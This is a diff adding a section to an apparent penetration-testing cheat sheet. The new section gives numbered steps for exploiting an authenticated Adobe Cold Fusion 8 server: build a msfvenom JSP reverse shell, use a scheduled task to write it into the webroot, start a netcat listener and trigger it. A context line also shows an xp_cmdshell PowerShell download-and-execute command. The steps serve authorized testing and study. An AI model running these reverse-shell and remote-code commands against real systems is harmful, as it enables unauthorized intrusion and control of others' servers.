@@ -428,3 +428,19 @@ xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring("http://<IP>
 
 ### Adobe Cold Fusion
 https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf
+
+### Exploiting Cold Fusion 8 (Authenticated)
+
+```
+1. Login to Cold Fusion.
+2. Create a scheduled task under Debugging and Logging.
+3. Provide Task Name
+4. Create your jsp payload msvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.30 lport=32115 -f raw > x.jsp
+5. URL enter your http server with the malicious reverse_tcp jsp http://x.x.x.x/x.jsp
+6. username and password of cold fusion account.
+7. check publish (Save output to a file)
+8. File should be your outdirectory C:\ColdFusion8\wwwroot\CFIDE\x.jsp
+9. Run your scheduled task
+10. Setup your netcat listener nc -nvlp 32115
+11. Navigate to http://targetsite/CFIDE/x.jsp execute your reverse_tcp
+```
